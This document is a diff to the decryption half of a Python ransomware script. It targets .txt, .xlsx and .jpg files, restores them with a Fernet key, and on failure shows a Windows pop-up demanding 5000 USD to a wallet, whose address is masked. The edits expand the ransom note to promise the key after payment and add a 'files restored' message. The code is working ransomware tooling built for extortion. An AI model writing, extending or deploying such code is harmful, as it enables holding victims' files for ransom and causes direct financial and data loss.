@@ -1,11 +1,9 @@
 import os
-import string
 import rsa
 import ctypes
 import sys
-
 from cryptography.fernet import Fernet
-
+MessageBox = ctypes.windll.user32.MessageBoxW
 # File extensions to encrypt
 def extensions(ext):
     return set(ext)
@@ -36,7 +34,7 @@ def decrypt_key():
             return decrypted_fernet_key
 
     except FileNotFoundError:
-        ctypes.windll.user32.MessageBoxW(0, 'ERROR. In order to recover your files you must pay the ransom. To do this, you must transfer 5000 USD (Five thousand US dollars) to the following Wallet.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'PAY THE RANSOM', 1)
+        MessageBox(0, 'ERROR. In order to recover your files you must pay the ransom. To do this, you must transfer 5000 USD (Five thousand US dollars) to the following Wallet.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nAfter that,we will provide you with the key to be saved in the Keys folder.', 'PAY THE RANSOM', 1)
         sys.exit(1)
 
 
@@ -50,8 +48,8 @@ def decrypt_files(paths, file_key):
             decrypted = fernet.decrypt(archivo_encriptado)
             with open(file_path, 'wb') as f:
                 f.write(decrypted)
-            print("Se ha desencriptado el siguiente archivo :", file_path)
-
+            print("Decrypting file ", file_path)
+    MessageBox(0, 'Thank you for collaborating with us. Your files have been restored', 'Files restored', 1)
 
 def main():
     encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
